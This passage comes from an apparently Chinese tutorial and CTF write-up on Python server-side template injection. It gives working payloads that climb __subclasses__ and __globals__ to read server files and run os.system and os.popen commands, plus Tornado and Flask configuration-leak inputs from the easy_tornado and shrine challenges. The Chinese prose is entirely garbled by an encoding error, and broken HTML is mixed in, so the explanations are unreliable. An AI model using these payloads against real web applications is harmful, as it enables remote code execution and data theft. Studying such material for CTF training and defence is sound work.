<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'instancemethod'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">31</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'function'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'classobj'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'dictproxy'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">34</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'generator'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">35</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'getset_descriptor'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">36</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'wrapper_descriptor'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">37</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'instance'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">38</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'ellipsis'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'member_descriptor'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'file'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">41</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'PyCapsule'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'cell'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">43</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'callable-iterator'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">44</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'iterator'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'sys.long_info'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'sys.float_info'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'EncodingMap'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'fieldnameiterator'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">49</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'formatteriterator'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'sys.version_info'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">51</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'sys.flags'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">52</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'exceptions.BaseException'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">53</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'module'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">54</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'imp.NullImporter'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">55</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'zipimport.zipimporter'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">56</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'posix.stat_result'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">57</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'posix.statvfs_result'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">58</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'warnings.WarningMessage'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">59</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'warnings.catch_warnings'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_weakrefset._IterationGuard'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">61</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_weakrefset.WeakSet'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">62</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Hashable'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">63</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'classmethod'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Iterable'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">65</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Sized'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">66</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Container'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">67</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Callable'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">68</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'dict_keys'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">69</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'dict_items'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">70</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'dict_values'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">71</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'site._Printer'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">72</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'site._Helper'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">73</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'_sre.SRE_Pattern'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">74</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'_sre.SRE_Match'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">75</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'_sre.SRE_Scanner'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">76</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'site.Quitter'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">77</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'codecs.IncrementalEncoder'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">78</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'codecs.IncrementalDecoder'</span><span class="token operator">></span><span class="token punctuation">)</span></code></pre>
ä½¿ç”¨fileç±»ä¸­çš„openæ–¹æ³•æ˜¯ç¬¬40
<pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"/var/www/html/more.txt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token string">'m0re is sixsixsix'</span></code></pre>
## CTFä¾‹é¢˜è®­ç»ƒ
sstiçš„é¢˜ç›®ï¼Œæ€è·¯åˆ†æ
### æŸ¥çœ‹é…ç½®æ–‡ä»¶
ä»€ä¹ˆæ˜¯æŸ¥é…ç½®æ–‡ä»¶ï¼Ÿæˆ‘ä»¬éƒ½çŸ¥é“ä¸€ä¸ªpythonæ¡†æ¶ï¼Œæ¯”å¦‚è¯´flaskï¼Œåœ¨æ¡†æ¶ä¸­å†…ç½®äº†ä¸€äº›å…¨å±€å˜é‡ï¼Œå¯¹è±¡ï¼Œå‡½æ•°ç­‰ç­‰ã€‚æˆ‘ä»¬å¯ä»¥ç›´æ¥è®¿é—®æˆ–æ˜¯è°ƒç”¨ã€‚
### easy_tornado
æŸ¥çœ‹é…ç½®æ–‡ä»¶ï¼Œåœ¨è¿™é‡Œæ˜¯tornadoæ¡†æ¶ï¼Œé…ç½®æ–‡ä»¶åœ¨`handler.settings`
æ„é€ payload
<pre class="language-bash" data-language="bash"><code class="language-bash">error?msg<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>handler.settings<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>
å³å¯æŸ¥çœ‹é…ç½®æ–‡ä»¶
![m0re](https://gitee.com/m0re/picture/raw/master/img/20201206174232.png)
è¯¦ç»†çš„ä¸å†™äº†ï¼Œä¹‹å‰å†™è¿‡ï¼Œå‚è€ƒ[https://blog.csdn.net/qq_45836474/article/details/107940521#_2018easy_tornado_1](https://blog.csdn.net/qq_45836474/article/details/107940521#_2018easy_tornado_1)

### shrine
ç»™å‡ºæºç å¦‚ä¸‹ï¼š
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> flask
<span class="token keyword">import</span> os
app <span class="token operator">=</span> flask<span class="token punctuation">.</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'FLAG'</span><span class="token punctuation">]</span> <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'FLAG'</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/shrine/&lt;path:shrine>'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">shrine</span><span class="token punctuation">(</span>shrine<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">safe_jinja</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
        s <span class="token operator">=</span> s<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'('</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">')'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
        blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'config'</span><span class="token punctuation">,</span> <span class="token string">'self'</span><span class="token punctuation">]</span>
        <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> blacklist<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> s
    <span class="token keyword">return</span> flask<span class="token punctuation">.</span>render_template_string<span class="token punctuation">(</span>safe_jinja<span class="token punctuation">(</span>shrine<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre>
è®¿é—®/shrine/&#123;&#123;1+1&#125;&#125; ![m0re](https://gitee.com/m0re/picture/raw/master/img/20201206194239.png) å­˜åœ¨sstiæ³¨å…¥ï¼ŒæŸ¥çœ‹é…ç½®æ–‡ä»¶ï¼Œæºç æ˜¾ç¤ºé»‘åå•</code>config,self<code>å‡å¦‚æ²¡æœ‰è¿™ä¸ªé»‘åå•ï¼Œé‚£ä¹ˆå¯ä»¥è¿™æ ·æŸ¥çœ‹é…ç½®æ–‡ä»¶ã€‚ ä¼ å…¥&#123;&#123;config&#125;&#125;æˆ–è€…&#123;&#123;self.__dict__&#125;&#125;éƒ½å¯ä»¥æŸ¥çœ‹é…ç½®ã€‚ pythonçš„æ²™ç®±é€ƒé€¸è¿™é‡Œçš„æ–¹æ³•æ˜¯åˆ©ç”¨pythonå¯¹è±¡ä¹‹é—´çš„å¼•ç”¨å…³ç³»æ¥è°ƒç”¨è¢«ç¦ç”¨çš„å‡½æ•°å¯¹è±¡ã€‚url_forå’Œget_flashed_messages payload:</code>`<br><img src="https://gitee.com/m0re/picture/raw/master/img/20201206201259.png" alt="m0re" loading="lazy"><br>url_foråŒç†<br><img src="https://gitee.com/m0re/picture/raw/master/img/20201206201332.png" alt="m0re" loading="lazy"></p>
<h3 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h3><p>å‘½ä»¤æ‰§è¡Œï¼Œé€šè¿‡ç±»çš„ç»§æ‰¿ä¸€æ­¥ä¸€æ­¥è°ƒç”¨åˆ°å¯¹åº”å‡½æ•°æ¥æ‰§è¡Œå‘½ä»¤ï¼Œè¿™é‡Œå­¦ä¹ ä¸‰ä¸ªå‡½æ•°çš„è°ƒç”¨ã€‚</p>
<h3 id="os-system"><a href="#os-system" class="headerlink" title="os.system"></a>os.system</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#python2</span>
<span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">71</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span></code></pre>
<p>ç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯æœ‰æ—¶æœ‰å›æ˜¾ï¼Œæœ‰æ—¶æ— å›æ˜¾ï¼Œåé¢å­¦ä¹ æ— å›æ˜¾çš„æƒ…å†µã€‚<br>è¿™ä¸ªè°ƒç”¨ç›¸å½“ç›´æ¥ï¼Œä¸”æ˜¯åŒæ­¥è¿›è¡Œçš„ï¼Œç¨‹åºéœ€è¦é˜»å¡å¹¶ç­‰å¾…è¿”å›ã€‚è¿”å›å€¼æ˜¯ä¾èµ–äºç³»ç»Ÿçš„ï¼Œç›´æ¥è¿”å›ç³»ç»Ÿçš„è°ƒç”¨è¿”å›å€¼ã€‚<br>æ³¨æ„ï¼šè¯¥å‡½æ•°è¿”å›å‘½ä»¤æ‰§è¡Œç»“æœçš„è¿”å›å€¼ï¼Œå¹¶ä¸æ˜¯è¿”å›å‘½ä»¤çš„æ‰§è¡Œè¾“å‡ºï¼ˆæ‰§è¡ŒæˆåŠŸè¿”å›0ï¼Œå¤±è´¥è¿”å›-1ï¼‰</p>
<h3 id="os-popen"><a href="#os-popen" class="headerlink" title="os.popen()"></a>os.popen()</h3><p>popenæ–¹æ³•é€šè¿‡p.read()è·å–ç»ˆç«¯è¾“å‡ºï¼Œè€Œä¸”popenéœ€è¦å…³é—­close().å½“æ‰§è¡ŒæˆåŠŸæ—¶ï¼Œclose()ä¸è¿”å›ä»»ä½•å€¼ï¼Œå¤±è´¥æ—¶ï¼Œclose()è¿”å›ç³»ç»Ÿè¿”å›å€¼ï¼ˆå¤±è´¥è¿”å›1ï¼‰. å¯è§å®ƒè·å–è¿”å›å€¼çš„æ–¹å¼å’Œos.systemä¸åŒ<br>ç”¨æ³•ï¼šos.popen(command[,mode[,bufsize]])<br><code>è¯´æ˜ï¼šmode â€“ æ¨¡å¼æƒé™å¯ä»¥æ˜¯ â€˜râ€™(é»˜è®¤) æˆ– â€˜wâ€™ã€‚</code><br>popenæ–¹æ³•é€šè¿‡p.read()è·å–ç»ˆç«¯è¾“å‡ºï¼Œè€Œä¸”popenéœ€è¦å…³é—­close().å½“æ‰§è¡ŒæˆåŠŸæ—¶ï¼Œclose()ä¸è¿”å›ä»»ä½•å€¼ï¼Œå¤±è´¥æ—¶ï¼Œclose()è¿”å›ç³»ç»Ÿè¿”å›å€¼ï¼ˆå¤±è´¥è¿”å›1ï¼‰. å¯è§å®ƒè·å–è¿”å›å€¼çš„æ–¹å¼å’Œos.systemä¸åŒã€‚</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">71</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>ç”¨read()å¯ä»¥æŠŠç»“æœå›æ˜¾ã€‚</p>
<h3 id="subprocess"><a href="#subprocess" class="headerlink" title="subprocess"></a>subprocess</h3><p><code>subprocess</code> æ¨¡å—æœ‰æ¯”è¾ƒå¤šçš„åŠŸèƒ½ï¼Œ<code>subprocess</code>æ¨¡å—è¢«æ¨èç”¨æ¥æ›¿æ¢ä¸€äº›è€çš„æ¨¡å—å’Œå‡½æ•°ï¼Œå¦‚ï¼š<code>os.systemã€os.spawnã€os.popen</code>ç­‰<br><code>subprocess</code>æ¨¡å—ç›®çš„æ˜¯å¯åŠ¨ä¸€ä¸ªæ–°çš„è¿›ç¨‹å¹¶ä¸ä¹‹é€šä¿¡ã€‚è¿™é‡Œåªè®²ç”¨æ¥è¿è¡Œshellå‘½ä»¤çš„ä¸¤ä¸ªå¸¸ç”¨æ–¹æ³•ã€‚<br><code>subprocess.call(&quot;command&quot;)</code><br>çˆ¶è¿›ç¨‹ç­‰å¾…å­è¿›ç¨‹å®Œæˆ<br>è¿”å›é€€å‡ºä¿¡æ¯(<code>returncode</code>ï¼Œç›¸å½“äºLinux exit code)<br>ä¸os.systemåŠŸèƒ½ç›¸ä¼¼,ä¹Ÿæ— æ‰§è¡Œç»“æœçš„å›æ˜¾<br><code>subprocess.Popen(&quot;command&quot;)</code><br>Popenéå¸¸å¼ºå¤§ï¼Œæ”¯æŒå¤šç§å‚æ•°å’Œæ¨¡å¼ï¼Œé€šè¿‡å…¶æ„é€ å‡½æ•°å¯ä»¥çœ‹åˆ°æ”¯æŒå¾ˆå¤šå‚æ•°ã€‚ä½†Popenå‡½æ•°å­˜åœ¨ç¼ºé™·åœ¨äºï¼Œå®ƒæ˜¯ä¸€ä¸ªé˜»å¡çš„æ–¹æ³•ï¼Œå¦‚æœè¿è¡Œcmdå‘½ä»¤æ—¶äº§ç”Ÿå†…å®¹éå¸¸å¤šï¼Œå‡½æ•°å°±å®¹æ˜“é˜»å¡ã€‚å¦ä¸€ç‚¹ï¼ŒPopenæ–¹æ³•ä¹Ÿä¸ä¼šæ‰“å°å‡ºcmdçš„æ‰§è¡Œä¿¡æ¯ã€‚</p>
<h2 id="payloadå¦‚ä½•æ„é€ çš„"><a href="#payloadå¦‚ä½•æ„é€ çš„" class="headerlink" title="payloadå¦‚ä½•æ„é€ çš„"></a>payloadå¦‚ä½•æ„é€ çš„</h2><p>ä¸ºäº†é¿å…é‡é¢˜å°±æœpayloadçš„ç°è±¡ï¼Œå­¦ä¹ ä¸€ä¸‹å¦‚ä½•æ„é€ sstiå¯ç”¨payload<br>å¦‚æœè¦æ„é€ ä¸€ä¸ªæ‰§è¡Œå‘½ä»¤çš„payloadï¼Œé‚£ä¹ˆå°±å¯»æ‰¾osæ¨¡å—çš„systemå‡½æ•°è¿›è¡Œè°ƒç”¨å³å¯ã€‚</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">72</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span>

<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">72</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>æŸ¥é˜…èµ„æ–™å‘ç°è®¿é—®osæ¨¡å—è¿˜æœ‰ä»warnings.catchwarningsæ¨¡å—å…¥æ‰‹çš„ï¼Œè€Œè¿™ä¸¤ä¸ªæ¨¡å—åˆ†åˆ«ä½äºå…ƒç»„ä¸­çš„59ï¼Œ60å·å…ƒç´ ã€‚__init__æ–¹æ³•ç”¨äºå°†å¯¹è±¡å®ä¾‹åŒ–ï¼Œåœ¨è¿™ä¸ªå‡½æ•°ä¸‹æˆ‘ä»¬å¯ä»¥é€šè¿‡funcglobalsï¼ˆæˆ–è€…<code>__globals</code>ï¼‰çœ‹è¯¥æ¨¡å—ä¸‹æœ‰å“ªäº›globalså‡½æ•°ï¼ˆæ³¨æ„è¿”å›çš„æ˜¯å­—å…¸ï¼‰ï¼Œè€Œlinecacheå¯ç”¨äºè¯»å–ä»»æ„ä¸€ä¸ªæ–‡ä»¶çš„æŸä¸€è¡Œï¼Œè€Œè¿™ä¸ªå‡½æ•°å¼•ç”¨äº†osæ¨¡å—ã€‚</p>
<p>äºæ˜¯è¿˜å¯ä»¥æŒ–æ˜åˆ°ç±»ä¼¼payloadï¼ˆæ³¨æ„payloadéƒ½ä¸æ˜¯ç›´æ¥å¥—ç”¨çš„ï¼Œä¸åŒç¯å¢ƒè¯·è‡ªè¡Œæµ‹è¯•ï¼‰</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'linecache'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span>

<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>func_globals<span class="token punctuation">[</span><span class="token string">'linecache'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span></code></pre>
